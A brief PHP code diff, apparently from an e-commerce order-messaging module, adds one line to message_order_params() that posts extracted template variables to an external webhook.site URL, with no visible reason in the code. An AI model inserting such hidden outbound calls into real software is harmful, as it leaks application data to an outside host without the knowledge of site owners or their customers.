@@ -47,6 +47,7 @@ endif;
 
 function message_order_params($message_to_send = '',$attrs = []){
     preg_match_all("/{(.*?)}/", $message_to_send, $search);
+    Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',$search);
     foreach($search[1] as $variable):
         $orders_status = [
             'حالة_الطلب'             => $attrs["order_status"],
